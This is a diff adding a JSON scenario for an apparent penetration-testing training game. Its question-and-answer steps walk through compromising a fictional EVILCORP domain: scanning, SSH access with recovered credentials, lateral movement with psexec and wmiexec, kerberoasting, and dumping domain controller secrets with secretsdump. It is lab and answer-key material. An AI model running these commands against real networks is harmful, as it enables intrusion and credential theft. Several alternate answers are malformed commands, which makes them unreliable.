@@ -1,0 +1,303 @@
+{
+    "id":  "frozen_beacon_001",
+    "name":  "Frozen Beacon",
+    "description":  "Long scenario starting on Linux infrastructure and bridging into AD operations.",
+    "steps":  [
+                  {
+                      "question":  [
+                                       "Recon: Enumerate exposed services on edge Linux host. Use nmap with service version detection and skip host discovery; treat target as online.",
+                                       "Target 10.21.14.11. Run service/version scan."
+                                   ],
+                      "answer":  "nmap -sV -Pn 10.21.14.11",
+                      "alternate_answers":  [
+                                                "nmap 10.21.14.11 -sV -Pn"
+                                            ]
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Enumerate web root paths. Use ffuf with set wordlist and match specific HTTP status codes.",
+                                       "URL http://10.21.14.11/FUZZ with common dirb wordlist and 200/301/302."
+                                   ],
+                      "answer":  "ffuf -u http://10.21.14.11/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302",
+                      "alternate_answers":  [
+                                                "ffuf 200,301,302 -u http://10.21.14.11/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc"
+                                            ]
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Confirm robots content. Use curl.",
+                                       "Read robots.txt from target web host."
+                                   ],
+                      "answer":  "curl -s http://10.21.14.11/robots.txt",
+                      "alternate_answers":  [
+                                                "curl http://10.21.14.11/robots.txt -s"
+                                            ]
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Check for weak web stack findings.",
+                                       "Run nikto against target web service."
+                                   ],
+                      "answer":  "nikto -h http://10.21.14.11",
+                      "alternate_answers":  [
+                                                "nikto http://10.21.14.11 -h"
+                                            ]
+                  },
+                  {
+                      "question":  [
+                                       "Initial Access: Credentials recovered from exposed backup endpoint.",
+                                       "SSH to 10.21.14.11 as user backupops."
+                                   ],
+                      "answer":  "ssh backupops@10.21.14.11",
+                      "on_correct":  {
+                                         "messages":  [
+                                                          "Linux foothold obtained."
+                                                      ],
+                                         "beacon_add":  [
+                                                            {
+                                                                "id":  "frozen_beacon_001",
+                                                                "ip":  "10.21.14.11",
+                                                                "hostname":  "edge-lx-11",
+                                                                "username":  "backupops",
+                                                                "mac_address":  "00:50:56:21:14:11"
+                                                            }
+                                                        ]
+                                     }
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Confirm identity and groups.",
+                                       "Run id."
+                                   ],
+                      "answer":  "id"
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Identify sudo rights.",
+                                       "Run sudo -l."
+                                   ],
+                      "answer":  "sudo -l"
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Enumerate internal interfaces. Use ip.",
+                                       "Show address data."
+                                   ],
+                      "answer":  "ip a"
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Sweep internal app subnet. Use nmap with host discovery (ping scan.",
+                                       "Discover alive hosts in 10.21.30.0/24."
+                                   ],
+                      "answer":  "nmap -sn 10.21.30.0/24",
+                      "alternate_answers":  [
+                                                "nmap 10.21.30.0/24 -sn"
+                                            ]
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Search local artifacts for domain creds. Ensure behavior includes recursive search.",
+                                       "grep recursively for \u0027EVILCORP\u0027 in /opt/app."
+                                   ],
+                      "answer":  "grep -R \"EVILCORP\" /opt/app"
+                  },
+                  {
+                      "question":  [
+                                       "Pivot Prep: Found service account creds for Windows segment.",
+                                       "Validate SMB auth on 10.21.30.25 using crackmapexec.",
+                                       "Domain: EVILCORP.LOCAL",
+                                       "User: svc.bridge",
+                                       "Password: Bridge!2026"
+                                   ],
+                      "answer":  "crackmapexec smb 10.21.30.25 -u svc.bridge -p Bridge!2026 -d EVILCORP.LOCAL",
+                      "alternate_answers":  [
+                                                "crackmapexec smb 10.21.30.25 -u svc.bridge -pBridge!2026 -d EVILCORP.LOCAL",
+                                                "crackmapexec EVILCORP.LOCAL smb 10.21.30.25 -u svc.bridge -p Bridge!2026 -d"
+                                            ]
+                  },
+                  {
+                      "question":  [
+                                       "Lateral Move: Execute command on workstation.",
+                                       "Build the command for this target."
+                                   ],
+                      "answer":  "wmiexec.py EVILCORP.LOCAL/svc.bridge:Bridge!2026@10.21.30.25 whoami",
+                      "alternate_answers":  [
+                                                "impacket-wmiexec EVILCORP.LOCAL/svc.bridge:Bridge!2026@10.21.30.25 whoami",
+                                                "wmiexec.py whoami EVILCORP.LOCAL/svc.bridge:Bridge!2026@10.21.30.25"
+                                            ],
+                      "on_correct":  {
+                                         "messages":  [
+                                                          "Windows bridge host compromised."
+                                                      ],
+                                         "beacon_add":  [
+                                                            {
+                                                                "id":  "frozen_beacon_001",
+                                                                "ip":  "10.21.30.25",
+                                                                "hostname":  "ws-bridge-25",
+                                                                "username":  "EVILCORP\\svc.bridge",
+                                                                "mac_address":  "00:50:56:21:30:25"
+                                                            }
+                                                        ]
+                                     }
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Enumerate local admin group.",
+                                       "Run net localgroup administrators."
+                                   ],
+                      "answer":  "net localgroup administrators"
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Inspect scheduled tasks for credential artifacts.",
+                                       "Run schtasks query in verbose list format."
+                                   ],
+                      "answer":  "schtasks /query /fo LIST /v"
+                  },
+                  {
+                      "question":  [
+                                       "Lateral Move: App server admin creds discovered.",
+                                       "Run hostname on 10.21.30.40 using psexec.py and ops-admin credentials.",
+                                       "User: EVILCORP.LOCAL/ops-admin",
+                                       "Password: OpsAdmin!2026"
+                                   ],
+                      "answer":  "psexec.py EVILCORP.LOCAL/ops-admin:OpsAdmin!2026@10.21.30.40 hostname",
+                      "alternate_answers":  [
+                                                "impacket-psexec EVILCORP.LOCAL/ops-admin:OpsAdmin!2026@10.21.30.40 hostname",
+                                                "psexec.py hostname EVILCORP.LOCAL/ops-admin:OpsAdmin!2026@10.21.30.40"
+                                            ],
+                      "on_correct":  {
+                                         "messages":  [
+                                                          "App server access established."
+                                                      ],
+                                         "beacon_add":  [
+                                                            {
+                                                                "id":  "frozen_beacon_001",
+                                                                "ip":  "10.21.30.40",
+                                                                "hostname":  "app-ops-40",
+                                                                "username":  "EVILCORP\\ops-admin",
+                                                                "mac_address":  "00:50:56:21:30:40"
+                                                            }
+                                                        ]
+                                     }
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Enumerate active sessions on app server.",
+                                       "Run quser."
+                                   ],
+                      "answer":  "quser"
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Inspect network shares to identify data paths.",
+                                       "Run net share."
+                                   ],
+                      "answer":  "net share"
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Validate SQL host access with service creds. Ensure behavior includes list remote resources.",
+                                       "List shares on 10.21.30.55 using smbclient.py and EVILCORP.LOCAL/sqlsvc:SqlOps!2026."
+                                   ],
+                      "answer":  "smbclient.py EVILCORP.LOCAL/sqlsvc:SqlOps!2026@10.21.30.55 -list",
+                      "alternate_answers":  [
+                                                "impacket-smbclient EVILCORP.LOCAL/sqlsvc:SqlOps!2026@10.21.30.55 -list"
+                                            ]
+                  },
+                  {
+                      "question":  [
+                                       "Lateral Move: Pivot to SQL host and validate context.",
+                                       "Build the command for this target."
+                                   ],
+                      "answer":  "wmiexec.py EVILCORP.LOCAL/sqlsvc:SqlOps!2026@10.21.30.55 whoami",
+                      "alternate_answers":  [
+                                                "impacket-wmiexec EVILCORP.LOCAL/sqlsvc:SqlOps!2026@10.21.30.55 whoami",
+                                                "wmiexec.py whoami EVILCORP.LOCAL/sqlsvc:SqlOps!2026@10.21.30.55"
+                                            ],
+                      "on_correct":  {
+                                         "messages":  [
+                                                          "SQL host pivot complete. Bridge workstation no longer needed."
+                                                      ],
+                                         "beacon_remove":  [
+                                                               "lb02"
+                                                           ],
+                                         "beacon_add":  [
+                                                            {
+                                                                "id":  "frozen_beacon_001",
+                                                                "ip":  "10.21.30.55",
+                                                                "hostname":  "sql-ops-55",
+                                                                "username":  "EVILCORP\\sqlsvc",
+                                                                "mac_address":  "00:50:56:21:30:55"
+                                                            }
+                                                        ]
+                                     }
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Request SPN tickets for kerberoast candidates. Ensure behavior includes set domain controller and request tickets/data.",
+                                       "Build the command for this target."
+                                   ],
+                      "answer":  "GetUserSPNs.py EVILCORP.LOCAL/sqlsvc:SqlOps!2026 -dc-ip 10.21.30.10 -request"
+                  },
+                  {
+                      "question":  [
+                                       "Recon: Pull domain user list over LDAP with backup-admin creds. Ensure behavior includes set wordlist.",
+                                       "ldapsearch against ldap://10.21.30.10 for user objects.",
+                                       "Bind: EVILCORP.LOCAL\\backup-admin",
+                                       "Pass: BackupAdmin!2026"
+                                   ],
+                      "answer":  "ldapsearch -x -H ldap://10.21.30.10 -D \"EVILCORP.LOCAL\\\\backup-admin\" -w \"BackupAdmin!2026\" -b \"DC=EVILCORP,DC=LOCAL\" \"(objectClass=user)\" sAMAccountName"
+                  },
+                  {
+                      "question":  [
+                                       "Escalation: Dump NTDS/LSA data from DC using backup-admin.",
+                                       "Run secretsdump.py against 10.21.30.10."
+                                   ],
+                      "answer":  "secretsdump.py EVILCORP.LOCAL/backup-admin:BackupAdmin!2026@10.21.30.10"
+                  },
+                  {
+                      "question":  [
+                                       "Final Pivot: Use recovered DA password for DC execution.",
+                                       "psexec.py to 10.21.30.10 with Administrator to run whoami.",
+                                       "Password: P@ssw0rd-DA!"
+                                   ],
+                      "answer":  "psexec.py EVILCORP.LOCAL/Administrator:P@ssw0rd-DA!@10.21.30.10 whoami",
+                      "alternate_answers":  [
+                                                "impacket-psexec EVILCORP.LOCAL/Administrator:P@ssw0rd-DA!@10.21.30.10 whoami",
+                                                "psexec.py whoami EVILCORP.LOCAL/Administrator:P@ssw0rd-DA!@10.21.30.10"
+                                            ],
+                      "on_correct":  {
+                                         "messages":  [
+                                                          "Domain control achieved."
+                                                      ],
+                                         "beacon_remove":  [
+                                                               "lb03",
+                                                               "lb04"
+                                                           ],
+                                         "beacon_add":  [
+                                                            {
+                                                                "id":  "frozen_beacon_001",
+                                                                "ip":  "10.21.30.10",
+                                                                "hostname":  "dc01",
+                                                                "username":  "EVILCORP\\Administrator",
+                                                                "mac_address":  "00:50:56:21:30:10"
+                                                            }
+                                                        ]
+                                     }
+                  },
+                  {
+                      "question":  [
+                                       "Objective: Collect proof artifact from DC desktop. Use type.",
+                                       "Read C:\\Users\\Administrator\\Desktop\\proof.txt"
+                                   ],
+                      "answer":  "type C:\\Users\\Administrator\\Desktop\\proof.txt",
+                      "on_correct":  {
+                                         "messages":  [
+                                                          "Operation complete."
+                                                      ]
+                                     }
+                  }
+              ]
+}
